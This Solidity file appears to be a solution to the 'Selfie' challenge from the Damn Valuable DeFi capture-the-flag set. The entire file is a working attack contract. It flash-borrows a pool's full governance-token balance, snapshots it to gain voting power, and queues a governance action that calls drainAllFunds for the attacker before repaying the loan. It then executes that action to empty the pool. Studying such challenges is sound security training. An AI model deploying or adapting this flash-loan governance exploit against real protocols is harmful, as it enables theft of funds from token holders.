// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "@openzeppelin/contracts/token/ERC20/extensions/ERC20Snapshot.sol";
import "../DamnValuableTokenSnapshot.sol";
import "./SimpleGovernance.sol";


interface ISelfiePool {
    function flashLoan(uint256 amount) external;
     function drainAllFunds(address receiver) external;
}

contract SelfieAttack {
    ISelfiePool public sfPool;
    DamnValuableTokenSnapshot public governanceToken;
    SimpleGovernance public governance;

    uint256 public actionId;
    address public attacker;
    constructor (ISelfiePool _sfPool, DamnValuableTokenSnapshot _governanceToken, SimpleGovernance _governance) {
        sfPool = _sfPool;
        governanceToken = _governanceToken;
        governance = _governance;
    }

    function attack() external {
        uint256 amount = governanceToken.balanceOf(address(sfPool));
        attacker = tx.origin;
        
        sfPool.flashLoan(amount);
    }

    function receiveTokens(address, uint256 amount) external payable{
        governanceToken.snapshot();

        bytes memory data = abi.encodeWithSignature("drainAllFunds(address)", attacker);
        actionId = governance.queueAction(address(sfPool), data, 0);
        governanceToken.transfer(address(sfPool), amount);         // payback to flashloan
    }

    function claim() external payable {
        governance.executeAction(actionId);
    } 

    receive() external payable{}
}